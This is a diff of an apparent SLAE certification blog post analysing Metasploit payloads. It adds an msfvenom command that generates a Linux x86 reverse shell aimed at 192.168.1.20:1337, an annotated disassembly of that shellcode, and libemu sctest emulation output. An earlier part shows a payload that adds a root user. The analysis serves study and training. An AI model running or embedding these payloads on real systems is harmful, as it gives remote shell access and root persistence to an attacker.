@@ -328,7 +328,7 @@ ELF Header:
 
 Loading the binary with GDB and setting necessary breakpoints gives shows us the disassembled binary.
 
-```
+```asm
 dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ gdb -q add_user
 Reading symbols from /home/dubs3c/SLAE/EXAM/github/assignment_5/add_user...(no debugging symbols found)...done.
 (gdb) b *0x8048054
@@ -392,7 +392,7 @@ End of assembler dump.
 
 We are interested in the following instruction `0x0804807a:  call   0x80480a7`. Let's set a breakpoint and step to the next instruction to see where we land!
 
-```
+```asm
 (gdb) b *0x0804807a
 Breakpoint 2 at 0x804807a
 (gdb) c
@@ -428,6 +428,116 @@ metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh
 Should be noted that the binary needs to be run as root, since it's adding a root user.
 
 ## linux/x86/shell/reverse_tcp
+
+For the final paylaod, we'll analyse `linux/x86/shell/reverse_tcp` which can be generated with:
+
+```
+$ msfvenom -p linux/x86/shell/reverse_tcp -a x86 --platform linux lhost=192.168.1.20 lport=1337 -f elf -o build/reverse_tcp
+```
+
+A reverse shell will send a local shell to a remote server, often controlled by an attacker. Let's begin analysing with `ndisasm` again.
+
+```asm
+dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ msfvenom -p linux/x86/shell/reverse_tcp -a x86 --platform linux lhost=192.168.1.20 lport=1337 -f raw | ndisasm -u -
+No encoder specified, outputting raw payload
+Payload size: 123 bytes
+
+00000000  6A0A              push byte +0xa
+00000002  5E                pop esi
+00000003  31DB              xor ebx,ebx
+00000005  F7E3              mul ebx
+00000007  53                push ebx                ; socket protocol: 0
+00000008  43                inc ebx                 ; SYS_SOCKET
+00000009  53                push ebx                ; socket type: SOCK_STREAM = 1
+0000000A  6A02              push byte +0x2          ; socket domain: PF_INET = 2
+0000000C  B066              mov al,0x66             ; socketcall()
+0000000E  89E1              mov ecx,esp             ; socket() arguments used in second parameter for socketcall
+00000010  CD80              int 0x80
+00000012  97                xchg eax,edi
+00000013  5B                pop ebx
+00000014  68C0A80114        push dword 0x1401a8c0   ; 192.168.1.20
+00000019  6802000539        push dword 0x39050002   ; 1337
+0000001E  89E1              mov ecx,esp             ; sockaddr struct
+00000020  6A66              push byte +0x66         ; socketcall()
+00000022  58                pop eax
+00000023  50                push eax
+00000024  51                push ecx
+00000025  57                push edi
+00000026  89E1              mov ecx,esp             ; connect() arguments used in second parameter for socketcall
+00000028  43                inc ebx                 ; SYS_CONNECT
+00000029  CD80              int 0x80
+0000002B  85C0              test eax,eax
+0000002D  7919              jns 0x48
+0000002F  4E                dec esi
+00000030  743D              jz 0x6f
+00000032  68A2000000        push dword 0xa2
+00000037  58                pop eax
+00000038  6A00              push byte +0x0
+0000003A  6A05              push byte +0x5
+0000003C  89E3              mov ebx,esp
+0000003E  31C9              xor ecx,ecx
+00000040  CD80              int 0x80
+00000042  85C0              test eax,eax
+00000044  79BD              jns 0x3
+00000046  EB27              jmp short 0x6f
+00000048  B207              mov dl,0x7
+0000004A  B900100000        mov ecx,0x1000
+0000004F  89E3              mov ebx,esp
+00000051  C1EB0C            shr ebx,0xc
+00000054  C1E30C            shl ebx,0xc
+00000057  B07D              mov al,0x7d
+00000059  CD80              int 0x80
+0000005B  85C0              test eax,eax
+0000005D  7810              js 0x6f
+0000005F  5B                pop ebx
+00000060  89E1              mov ecx,esp
+00000062  99                cdq
+00000063  B224              mov dl,0x24
+00000065  B003              mov al,0x3
+00000067  CD80              int 0x80
+00000069  85C0              test eax,eax
+0000006B  7802              js 0x6f
+0000006D  FFE1              jmp ecx
+0000006F  B801000000        mov eax,0x1
+00000074  BB01000000        mov ebx,0x1
+00000079  CD80              int 0x80
+```
+
+Another tool we can use for analysing shellcode is [sctest](https://www.aldeid.com/wiki/Libemu/sctest) which can be used for emulating shellcode. Running the following commands will create a graphical image showing which syscalls are being made.
+
+```
+dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ msfvenom -p linux/x86/shell/reverse_tcp -a x86 --platform linux lhost=192.168.1.20 lport=1337 -f raw | ~/SLAE/libemu/tools/sctest/sctest -vvv -Ss 100000 -G reverse_tcp.dot
+dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ dot reverse_tcp.dot -Tpng -o reverse_tcp.png
+```
+
+The generated image:
+
+![reverse_tcp.png](reverse_tcp.png)
+
+In addition to generating images, `sctest` will also generate some C code based on the structures used by each syscall. For example, the C code below corresponds to creating a `socket` and then calling the `connect` syscall. We can also see the configured port and IP address.
+
+```c
+int socket (
+     int domain = 2;
+     int type = 1;
+     int protocol = 0;
+) =  14;
+int connect (
+     int sockfd = 14;
+     struct sockaddr_in * serv_addr = 0x00416fbe =>
+         struct   = {
+             short sin_family = 2;
+             unsigned short sin_port = 14597 (port=1337);
+             struct in_addr sin_addr = {
+                 unsigned long s_addr = 335653056 (host=192.168.1.20);
+             };
+             char sin_zero = "       ";
+         };
+     int addrlen = 102;
+) =  0;
+```
+
+This shellcode will connect to 192.168.1.20 at port 1337.
 
 ---
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
